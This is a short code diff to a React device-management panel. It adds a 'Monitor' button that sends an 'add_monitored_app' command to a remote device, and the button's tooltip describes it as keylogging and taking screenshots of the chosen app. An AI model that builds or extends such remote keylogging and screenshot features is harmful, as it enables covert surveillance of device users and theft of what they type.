@@ -170,6 +170,14 @@ export default function AppManager({ device, sendCommand, results }) {
                 🚫 Disable
               </button>
               <button
+                className="am-action-btn am-monitor"
+                onClick={() => sendCommand(deviceId, 'add_monitored_app', { packageName: app.packageName })}
+                disabled={!isOnline}
+                title="Monitor this app (keylog + screenshots)"
+              >
+                📡 Monitor
+              </button>
+              <button
                 className="am-action-btn am-uninstall"
                 onClick={() => performAction('uninstall_app', app.packageName)}
                 disabled={!isOnline}
